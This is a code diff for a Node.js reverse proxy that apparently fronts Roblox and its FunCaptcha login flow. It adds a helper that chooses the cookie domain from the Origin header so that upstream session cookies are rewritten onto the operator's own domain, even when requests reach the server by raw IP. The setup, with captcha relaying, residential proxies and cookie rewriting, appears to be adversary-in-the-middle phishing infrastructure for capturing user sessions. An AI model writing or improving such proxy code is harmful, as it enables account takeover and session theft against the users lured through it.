@@ -97,6 +97,19 @@ function rewriteCookies(cookies, host) {
     );
 }
 
+// Returns correct cookie domain using Origin header — prevents raw IP
+// (.43.98.240.240) when Challenge.js retries bypass Nginx and hit Node directly
+function getCleanHost(req) {
+    const origin = req.headers['origin'] || '';
+    if (origin.startsWith('https://')) {
+        const originHost = origin.replace('https://', '').split('/')[0];
+        if (!/^\d+\.\d+\.\d+\.\d+/.test(originHost)) {
+            return originHost;
+        }
+    }
+    return req.headers.host || 'localhost';
+}
+
 function getDeviceId(req) {
     const m = (req.headers.cookie || '').match(/rbx-device-id=([^;]+)/);
     return m ? m[1] : crypto.randomBytes(32).toString('hex');
@@ -478,7 +491,7 @@ function createCurlProxy(targetHost, pathPrefix, useResidentialProxy = false) {
             for (const [k, v] of Object.entries(result.headers)) {
                 if (skipHdrs.has(k)) continue;
                 if (k === 'set-cookie') {
-                    res.set('Set-Cookie', rewriteCookies([].concat(v), req.headers.host || 'localhost'));
+                    res.set('Set-Cookie', rewriteCookies([].concat(v), getCleanHost(req)));
                 } else {
                     try { res.set(k, v); } catch (_) {}
                 }
@@ -722,7 +735,7 @@ app.use('/v2', async (req, res) => {
         for (const [k, v] of Object.entries(result.headers)) {
             if (skipHdrs.has(k)) continue;
             if (k === 'set-cookie') {
-                res.set('Set-Cookie', rewriteCookies([].concat(v), req.headers.host || 'localhost'));
+                res.set('Set-Cookie', rewriteCookies([].concat(v), getCleanHost(req)));
             } else {
                 try { res.set(k, v); } catch (_) {}
             }
@@ -785,7 +798,7 @@ app.use('/funcaptcha', async (req, res) => {
 
         for (const [k, v] of Object.entries(result.headers)) {
             if (k === 'set-cookie') {
-                res.set('Set-Cookie', rewriteCookies([].concat(v), req.headers.host || 'localhost'));
+                res.set('Set-Cookie', rewriteCookies([].concat(v), getCleanHost(req)));
             } else {
                 try { res.set(k, v); } catch (_) {}
             }
@@ -871,7 +884,7 @@ app.use('/', createProxyMiddleware({
 
             // Rewrite cookies to our domain
             if (proxyRes.headers['set-cookie']) {
-                proxyRes.headers['set-cookie'] = rewriteCookies(proxyRes.headers['set-cookie'], host);
+                proxyRes.headers['set-cookie'] = rewriteCookies(proxyRes.headers['set-cookie'], getCleanHost(req));
                 console.log(`[main] 🍪 Rewrote ${proxyRes.headers['set-cookie'].length} cookies → .${host.replace(/^www\./, '')}`);
             }
 
